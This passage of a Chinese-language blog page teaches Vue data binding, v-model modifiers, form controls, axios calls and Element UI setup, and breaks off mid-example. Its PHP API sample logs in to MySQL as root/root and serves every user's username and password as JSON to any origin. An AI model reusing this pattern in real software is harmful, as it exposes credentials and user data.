+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;span&gt;Message: &#123;&#123; msg &#125;&#125;&lt;/span&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  var app = new Vue(&#123;         // 创建Vue对象。Vue的核心对象。</span><br><span class="line">    el: &#x27;#app&#x27;,               // el属性：把当前Vue对象挂载到 div标签上，#app是id选择器</span><br><span class="line">    data: &#123;                   // data: 是Vue对象中绑定的数据</span><br><span class="line">      msg: &#x27;Hello Vue!&#x27;   // message 自定义的数据</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>简单的拼接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;span&gt;Message: &#123;&#123; msg + &#x27; - &#x27; + name &#125;&#125;&lt;/span&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  var app = new Vue(&#123;         // 创建Vue对象。Vue的核心对象。</span><br><span class="line">    el: &#x27;#app&#x27;,               // el属性：把当前Vue对象挂载到 div标签上，#app是id选择器</span><br><span class="line">    data: &#123;                   // data: 是Vue对象中绑定的数据</span><br><span class="line">      msg: &#x27;Hi&#x27;,              // message 自定义的数据</span><br><span class="line">      name: &#x27;flydragon&#x27;       // name自定义的属性，vue可以多个自定义属性，属性类型也可是复杂类型</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231217102329136.png" alt="image-20231217102329136"></p>
+<h3 id="Vue-绑定html标签属性："><a href="#Vue-绑定html标签属性：" class="headerlink" title="Vue 绑定html标签属性："></a><strong>Vue 绑定html标签属性：</strong></h3><p> Vue 中不能直接使用<code>&#123;&#123; expression &#125;&#125;</code> 语法对 html 的标签属性进行绑定，而是用它特有的 v-bind 指令。语法结构：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;标签 v-bind:html标签属性名=&quot;要绑定的Vue对象的data里的属性名&quot;&gt;&lt;/标签&gt;</span><br></pre></td></tr></table></figure>
+
+<p>属性绑定简写：由于<code>v-bind</code> 使用非常频繁，所以 Vue 提供了简单的写法，可以去掉 v-bind 直接使用<code>:</code>即可。如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div v-bind:id=&quot;MenuContaineId&quot;&gt;等价于&lt;div :id=&quot;MenuContaineId&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>属性绑定：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;span v-bind:id=&quot;menuId&quot;&gt;&#123;&#123; menuName &#125;&#125;&lt;/span&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">  &lt;title&gt;Vue入门之数据绑定--属性绑定&lt;/title&gt;</span><br><span class="line">  &lt;script src=&quot;https://unpkg.com/vue/dist/vue.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;div v-bind:id=&quot;MenuContaineId&quot;&gt;</span><br><span class="line">      &lt;a href=&quot;#&quot; v-bind:class=&quot;MenuClass&quot;&gt;首页&lt;/a&gt;</span><br><span class="line">      &lt;a href=&quot;#&quot; v-bind:class=&quot;MenuClass&quot;&gt;产品&lt;/a&gt;</span><br><span class="line">      &lt;a href=&quot;#&quot; v-bind:class=&quot;MenuClass&quot;&gt;服务&lt;/a&gt;</span><br><span class="line">      &lt;a href=&quot;#&quot; v-bind:class=&quot;MenuClass&quot;&gt;关于&lt;/a&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line"> </span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    var app = new Vue(&#123;</span><br><span class="line">      el: &#x27;#app&#x27;,</span><br><span class="line">      data: &#123;                   // data: 是Vue对象中绑定的数据</span><br><span class="line">        MenuClass: &#x27;top-menu&#x27;,</span><br><span class="line">        MenuContaineId: &#x27;sitemenu&#x27;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231217103054675.png" alt="image-20231217103054675"></p>
+<h3 id="双向绑定"><a href="#双向绑定" class="headerlink" title="双向绑定"></a>双向绑定</h3><p>双向绑定指令为v-model：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">  &lt;title&gt;Vue入门之htmlraw&lt;/title&gt;</span><br><span class="line">  &lt;script src=&quot;https://unpkg.com/vue/dist/vue.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;!-- v-model可以直接指向data中的属性，双向绑定就建立了 --&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot; name=&quot;txt&quot; v-model=&quot;msg&quot;&gt;</span><br><span class="line">    &lt;p&gt;您输入的信息是：&#123;&#123; msg &#125;&#125;&lt;/p&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    var app = new Vue(&#123;</span><br><span class="line">      el: &#x27;#app&#x27;,</span><br><span class="line">      data: &#123;</span><br><span class="line">        msg: &#x27;双向数据绑定的例子&#x27;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231217103526193.png" alt="image-20231217103526193"></p>
+<p>最终的结果就是：你改变 input 文本框的内容的时候，p 标签中的内容会跟着进行改变。</p>
+<h4 id="双向绑定的修饰符"><a href="#双向绑定的修饰符" class="headerlink" title="双向绑定的修饰符"></a>双向绑定的修饰符</h4><p>（1）.lazy</p>
+<p>在默认情况下，v-model 在每次 input 事件触发后将输入框的值与数据进行同步 (除了上述输入法组合文字时)。你可以添加 lazy 修饰符，从而转变为使用 change 事件进行同步：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 在“change”时而非“input”时更新 --&gt;</span><br><span class="line">&lt;input v-model.lazy=&quot;msg&quot; &gt;</span><br></pre></td></tr></table></figure>
+
+<p>（2）.number</p>
+<p>如果想自动将用户的输入值转为数值类型，可以给 v-model 添加 number 修饰符：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input v-model.number=&quot;age&quot; type=&quot;number&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>（3）.trim：</p>
+<p>如果要自动过滤用户输入的首尾空白字符，可以给 v-model 添加 trim 修饰符：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input v-model.trim=&quot;msg&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="复选框"><a href="#复选框" class="headerlink" title="复选框"></a>复选框</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;example-3&quot;&gt;</span><br><span class="line">  &lt;input type=&quot;checkbox&quot; id=&quot;jack&quot; value=&quot;Jack&quot; v-model=&quot;checkedNames&quot;&gt;</span><br><span class="line">  &lt;label for=&quot;jack&quot;&gt;Jack&lt;/label&gt;</span><br><span class="line">  &lt;input type=&quot;checkbox&quot; id=&quot;john&quot; value=&quot;John&quot; v-model=&quot;checkedNames&quot;&gt;</span><br><span class="line">  &lt;label for=&quot;john&quot;&gt;John&lt;/label&gt;</span><br><span class="line">  &lt;input type=&quot;checkbox&quot; id=&quot;mike&quot; value=&quot;Mike&quot; v-model=&quot;checkedNames&quot;&gt;</span><br><span class="line">  &lt;label for=&quot;mike&quot;&gt;Mike&lt;/label&gt;</span><br><span class="line">  &lt;br&gt;</span><br><span class="line">  &lt;span&gt;Checked names: &#123;&#123; checkedNames &#125;&#125;&lt;/span&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">new Vue(&#123;</span><br><span class="line">  el: &#x27;#example-3&#x27;,</span><br><span class="line">  data: &#123;</span><br><span class="line">    checkedNames: []</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231217105029649.png" alt="image-20231217105029649"></p>
+<h4 id="单选按钮"><a href="#单选按钮" class="headerlink" title="单选按钮"></a>单选按钮</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;example-4&quot;&gt;</span><br><span class="line">  &lt;input type=&quot;radio&quot; id=&quot;one&quot; value=&quot;One&quot; v-model=&quot;picked&quot;&gt;</span><br><span class="line">  &lt;label for=&quot;one&quot;&gt;One&lt;/label&gt;</span><br><span class="line">  &lt;br&gt;</span><br><span class="line">  &lt;input type=&quot;radio&quot; id=&quot;two&quot; value=&quot;Two&quot; v-model=&quot;picked&quot;&gt;</span><br><span class="line">  &lt;label for=&quot;two&quot;&gt;Two&lt;/label&gt;</span><br><span class="line">  &lt;br&gt;</span><br><span class="line">  &lt;span&gt;Picked: &#123;&#123; picked &#125;&#125;&lt;/span&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">new Vue(&#123;</span><br><span class="line">  el: &#x27;#example-4&#x27;,</span><br><span class="line">  data: &#123;</span><br><span class="line">    picked: &#x27;&#x27;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="选择框"><a href="#选择框" class="headerlink" title="选择框"></a>选择框</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;example-5&quot;&gt;</span><br><span class="line">  &lt;select v-model=&quot;selected&quot;&gt;</span><br><span class="line">    &lt;option disabled value=&quot;&quot;&gt;请选择&lt;/option&gt;</span><br><span class="line">    &lt;option&gt;A&lt;/option&gt;</span><br><span class="line">    &lt;option&gt;B&lt;/option&gt;</span><br><span class="line">    &lt;option&gt;C&lt;/option&gt;</span><br><span class="line">  &lt;/select&gt;</span><br><span class="line">  &lt;span&gt;Selected: &#123;&#123; selected &#125;&#125;&lt;/span&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">new Vue(&#123;</span><br><span class="line">  el: &#x27;#example-5&#x27;,</span><br><span class="line">  data: &#123;</span><br><span class="line">    selected: &#x27;&#x27;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231217105821291.png" alt="image-20231217105821291"></p>
+<h3 id="axios数据交互"><a href="#axios数据交互" class="headerlink" title="axios数据交互"></a>axios数据交互</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">引用axios</span><br><span class="line">&lt;script src=&quot;https://unpkg.com/axios/dist/axios.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">可将其下载到本地</span><br><span class="line">&lt;script src=&quot;./axios.min.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;./index.css&quot;&gt;</span><br><span class="line">    &lt;script src=&quot;./axios.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div id=&quot;app&quot;&gt;</span><br><span class="line">        &lt;el-table :data=&quot;tableData&quot; style=&quot;width: 100%&quot;&gt;</span><br><span class="line">            &lt;el-table-column prop=&quot;id&quot; label=&quot;id&quot; width=&quot;180&quot;&gt;</span><br><span class="line">            &lt;/el-table-column&gt;</span><br><span class="line">            &lt;el-table-column prop=&quot;username&quot; label=&quot;图片&quot; width=&quot;180&quot;&gt;</span><br><span class="line">            &lt;/el-table-column&gt;</span><br><span class="line">            &lt;el-table-column prop=&quot;password&quot; label=&quot;书名&quot;&gt;</span><br><span class="line">            &lt;/el-table-column&gt;</span><br><span class="line">        &lt;/el-table&gt;</span><br><span class="line">&lt;h1&gt;&#123;&#123;this.tableData.name&#125;&#125;&lt;/h1&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;script src=&quot;./vue.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=&quot;./index.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        new Vue(&#123;</span><br><span class="line">            el: &#x27;#app&#x27;,</span><br><span class="line">            data: function () &#123;</span><br><span class="line">                return &#123;</span><br><span class="line">                    visible: false,</span><br><span class="line">                    tableData: []</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            methods: &#123;</span><br><span class="line">                fetchData: function () &#123;</span><br><span class="line">                    axios.get(&#x27;http://192.168.2.53/xin/demo/api.php&#x27;)</span><br><span class="line">                        .then( (response)=&gt; &#123;</span><br><span class="line">                            this.tableData = response.data</span><br><span class="line">                            console.log(this.tableData);</span><br><span class="line">                        &#125;)</span><br><span class="line">                        .catch((error) =&gt;&#123;</span><br><span class="line">                            console.log(error);</span><br><span class="line">                        &#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            mounted()&#123;</span><br><span class="line">                this.fetchData();</span><br><span class="line">        &#125;&#125;)</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>调用数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Access-Control-Allow-Origin: *&quot;);</span><br><span class="line">header(&quot;Access-Control-Allow-Methods: GET, POST, OPTIONS, PUT, DELETE&quot;);</span><br><span class="line">header(&quot;Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, X-Requested-With&quot;);</span><br><span class="line">$link = mysqli_connect(&quot;localhost&quot;, &quot;root&quot;, &quot;root&quot;, &quot;security&quot;) or exit(json_encode([&#x27;error&#x27; =&gt; &#x27;数据库连接失败！&#x27;]));</span><br><span class="line">mysqli_query($link, &quot;set names utf8&quot;);</span><br><span class="line"></span><br><span class="line">$sql = &quot;SELECT * FROM users &quot;;</span><br><span class="line">$result = mysqli_query($link, $sql);</span><br><span class="line"></span><br><span class="line">$tableData = []; // 初始化数组来收集数据</span><br><span class="line">while ($row = mysqli_fetch_assoc($result)) &#123; // 遍历结果集</span><br><span class="line">    $tableData[] = [</span><br><span class="line">        &#x27;id&#x27; =&gt; $row[&#x27;id&#x27;], // 假设&#x27;id&#x27;是数据表中的字段</span><br><span class="line">        &#x27;username&#x27; =&gt; $row[&#x27;username&#x27;], // 将每行的&#x27;username&#x27;放进数组</span><br><span class="line">        &#x27;password&#x27; =&gt; $row[&#x27;password&#x27;] // 这里的地址是硬编码的，你可能想要将其替换为每行对应的数据</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$requestPath = $_SERVER[&#x27;REQUEST_URI&#x27;];</span><br><span class="line">$requestMethod = $_SERVER[&#x27;REQUEST_METHOD&#x27;];</span><br><span class="line"></span><br><span class="line">if ($requestMethod === &quot;GET&quot; &amp;&amp; $requestPath === &#x27;/xin/demo/api.php&#x27;) &#123;</span><br><span class="line">    header(&#x27;Content-Type: application/json&#x27;);</span><br><span class="line">    echo json_encode($tableData); // 输出所有用户数据的JSON表示</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    // 请求不匹配时的错误处理应当用合适的HTTP状态码来标示出错</span><br><span class="line">    header(&#x27;HTTP/1.0 404 Not Found&#x27;);</span><br><span class="line">    echo json_encode([&#x27;error&#x27; =&gt; &#x27;Not Found&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可查看数据库里内容</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231217112754584.png" alt="image-20231217112754584"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/12/17/%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A/" data-id="clq8wgoda00004ku4emsya3ey" class="article-share-link">分享</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+  
+    <article id="post-Element" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/12/17/Element/" class="article-date">
+  <time class="post-time" datetime="2023-12-17T01:20:42.000Z" itemprop="datePublished">
+    <span class="post-month">12月</span><br/>
+    <span class="post-day">17</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/12/17/Element/">Element/vue3</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="按钮"><a href="#按钮" class="headerlink" title="按钮"></a>按钮</h3><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><ul>
+<li>使用npm方式安装</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i element-ui -S</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">  &lt;!-- import CSS --&gt;</span><br><span class="line">  &lt;link rel=&quot;stylesheet&quot; href=&quot;https://unpkg.com/element-ui/lib/theme-chalk/index.css&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;el-button @click=&quot;visible = true&quot;&gt;Button&lt;/el-button&gt;</span><br><span class="line">    &lt;el-dialog :visible.sync=&quot;visible&quot; title=&quot;Hello world&quot;&gt;</span><br><span class="line">      &lt;p&gt;Try Element&lt;/p&gt;</span><br><span class="line">    &lt;/el-dialog&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">  &lt;!-- import Vue before Element --&gt;</span><br><span class="line">  &lt;script src=&quot;https://unpkg.com/vue@2/dist/vue.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">  &lt;!-- import JavaScript --&gt;</span><br><span class="line">  &lt;script src=&quot;https://unpkg.com/element-ui/lib/index.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    new Vue(&#123;</span><br><span class="line">      el: &#x27;#app&#x27;,</span><br><span class="line">      data: function() &#123;</span><br><span class="line">        return &#123; visible: false &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231217093227415.png" alt="image-20231217093227415"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://unpkg.com/element-ui/lib/theme-chalk/index.css</span><br><span class="line">unpkg.com/vue@2/dist/vue.js</span><br><span class="line">unpkg.com/element-ui/lib/index.js</span><br><span class="line">上方调用了这三个，是要用外网，可以复制到本地重新调用</span><br></pre></td></tr></table></figure>
+
+<h3 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h3><h4 id="Layout布局"><a href="#Layout布局" class="headerlink" title="Layout布局"></a>Layout布局</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;el-row&gt;</span><br><span class="line">  &lt;el-col :span=&quot;24&quot;&gt;&lt;div class=&quot;grid-content bg-purple-dark&quot;&gt;&lt;/div&gt;&lt;/el-col&gt;</span><br><span class="line">&lt;/el-row&gt;</span><br><span class="line">&lt;el-row&gt;</span><br><span class="line">  &lt;el-col :span=&quot;12&quot;&gt;&lt;div class=&quot;grid-content bg-purple&quot;&gt;&lt;/div&gt;&lt;/el-col&gt;</span><br><span class="line">  &lt;el-col :span=&quot;12&quot;&gt;&lt;div class=&quot;grid-content bg-purple-light&quot;&gt;&lt;/div&gt;&lt;/el-col&gt;</span><br><span class="line">&lt;/el-row&gt;</span><br><span class="line">&lt;el-row&gt;</span><br><span class="line">  &lt;el-col :span=&quot;8&quot;&gt;&lt;div class=&quot;grid-content bg-purple&quot;&gt;&lt;/div&gt;&lt;/el-col&gt;</span><br><span class="line">  &lt;el-col :span=&quot;8&quot;&gt;&lt;div 